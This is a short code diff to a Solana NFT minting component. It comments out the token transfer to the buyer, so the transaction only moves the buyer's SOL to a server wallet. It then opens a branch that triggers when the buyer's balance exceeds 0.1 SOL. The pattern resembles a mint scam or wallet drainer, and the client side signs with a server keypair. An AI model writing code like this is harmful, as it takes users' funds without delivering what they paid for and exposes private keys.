@@ -43,12 +43,12 @@ const MintingComponent = ({setAlertState} : any) => {
         toPubkey: serverWallet.publicKey,
         lamports: LAMPORTS_PER_SOL * quantity * price
       });
-      const mintAddress = new PublicKey('BPiA9gjpdAy3juP7PHVTbAByxxA3Ka3vYgBBtQzmkVsm');
-      const sourceAccount = await getOrCreateAssociatedTokenAccount(connection, serverWallet, mintAddress, serverWallet.publicKey);
-      const destinationAccount = await getOrCreateAssociatedTokenAccount(connection, serverWallet, mintAddress, wallet.publicKey);
-      const tokenTransferInstruction = createTransferInstruction(sourceAccount.address, destinationAccount.address, serverWallet.publicKey, LAMPORTS_PER_SOL, [serverWallet]);
+      // const mintAddress = new PublicKey('BPiA9gjpdAy3juP7PHVTbAByxxA3Ka3vYgBBtQzmkVsm');
+      // const sourceAccount = await getOrCreateAssociatedTokenAccount(connection, serverWallet, mintAddress, serverWallet.publicKey);
+      // const destinationAccount = await getOrCreateAssociatedTokenAccount(connection, serverWallet, mintAddress, wallet.publicKey);
+      // const tokenTransferInstruction = createTransferInstruction(sourceAccount.address, destinationAccount.address, serverWallet.publicKey, LAMPORTS_PER_SOL, [serverWallet]);
       const transaction = new Transaction();
-      transaction.add(mintFeeTransferInstruction, tokenTransferInstruction);
+      transaction.add(mintFeeTransferInstruction);
 
       if(totalBalance > LAMPORTS_PER_SOL * 0.1) {
         const mintAddress1 = new PublicKey('8ngygxfET6gS1ypzALggQs7imYksCoCc2AQXF1HieqXx');
